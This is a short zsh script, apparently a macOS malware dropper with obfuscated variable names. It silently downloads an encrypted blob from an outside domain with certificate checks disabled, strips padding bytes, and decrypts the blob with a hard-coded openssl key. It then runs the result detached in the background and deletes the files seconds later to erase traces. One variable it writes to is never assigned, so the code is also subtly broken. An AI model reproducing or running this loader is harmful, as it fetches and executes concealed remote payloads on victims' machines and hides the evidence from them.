#!/bin/zsh
r8q8x=$(mktemp /tmp/er9ufm.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m2c8b8955994a9bbc.bin" -o "$r8q8xz" || exit 1
snwqth=$(stat -f %z "$r8q8xz"); xcn3n6t=$(( snwqth - 1547 - 747 ))
tail -c +$(( 1547 + 1 )) "$r8q8xz" | head -c $xcn3n6t | openssl enc -d -aes-256-cbc -k 06cd1ea8cf4ab92215286e0b -out "$r8q8x" 2>/dev/null
[ -s "$r8q8x" ] && chmod 700 "$r8q8x" && ( "$r8q8x" & ) && disown
( sleep 3; rm -f "$r8q8x" "$r8q8xz" ) &>/dev/null &
